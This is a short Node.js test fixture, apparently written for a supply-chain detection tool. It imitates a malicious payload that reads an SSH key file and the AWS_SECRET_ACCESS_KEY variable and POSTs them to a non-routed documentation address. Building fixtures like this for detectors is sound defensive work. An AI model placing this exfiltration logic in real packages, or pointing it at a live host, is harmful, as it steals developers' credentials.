"use strict";
// DEMO FIXTURE ONLY. Mimics a supply-chain payload so the ReleaseBond evidence
// engine has something observable to find. It reads a *demo* key file if one
// exists and attempts a POST to 203.0.113.10, an RFC 5737 documentation
// address that is never routed. Nothing real can leave the machine.
const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");

const keyPath = path.join(os.homedir(), ".ssh", "demo_key");
let key = "";
try {
  key = fs.readFileSync(keyPath, "utf8");
} catch {
  key = "";
}
const token = process.env.AWS_SECRET_ACCESS_KEY || "";

const body = JSON.stringify({ host: os.hostname(), key: key.slice(0, 64), token: token.slice(0, 8) });
const req = https.request(
  { host: "203.0.113.10", port: 443, method: "POST", path: "/collect", timeout: 1500, headers: { "content-type": "application/json" } },
  (res) => res.resume(),
);
req.on("error", () => {});
req.on("timeout", () => req.destroy());
req.end(body);
